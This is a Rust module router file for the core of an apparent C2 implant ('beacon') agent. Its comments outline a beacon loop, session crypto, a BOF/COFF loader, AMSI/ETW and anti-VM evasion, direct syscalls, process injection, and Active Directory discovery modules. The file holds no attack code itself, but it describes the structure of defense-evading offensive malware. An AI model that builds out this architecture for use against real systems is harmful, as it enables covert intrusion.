// core_agent/mod.rs — module router for the agent core.
//
// Layout (restructured for clarity — every module lives in its own folder):
//   management/    : config.rs (baked build config + entry flow), profile.rs (runtime
//                    malleable-profile state), debug_log/write_log (this file's re-exports)
//   beacons/       : https_beacon.rs — the beacon loop, timing, jitter, working hours
//   commu/         : comms.rs — HTTP transport, session crypto handshake, wire codec
//   cryptography/  : crypto.rs — AES-256-GCM + HMAC-SHA256 session crypto
//   exec/          : dispatcher + inline command implementations + bof_bridge
//                    (BOF/COFF loader FFI — C sources live in <root>/bofs/)
//   evasion/       : AMSI/ETW/anti-VM/chain + native C
//   syscall/       : direct syscall stubs
//   injection/     : process injection FFI
#![allow(non_snake_case)]
#![allow(non_camel_case_types)]
#![allow(dead_code)]
#![allow(unused_imports)]
#![allow(clashing_extern_declarations)]

pub mod management;
pub mod beacons;
pub mod commu;
pub mod cryptography;
pub mod exec;
pub mod evasion;
pub mod syscall;
pub mod injection;
// v8 graph collectors (Phase D/E):
//   ad_map/       : `admap` — domain/DC/browse-list discovery (AD Map view)
//   attack_graph/ : `agraph` — node enrichment ARP/TCP (Attack Graph view)
pub mod ad_map;
pub mod attack_graph;

// Logging utilities live in management/ — re-exported here so existing
// `crate::core_agent::debug_log(...)` call sites keep working unchanged.
pub use management::{debug_log, write_log};
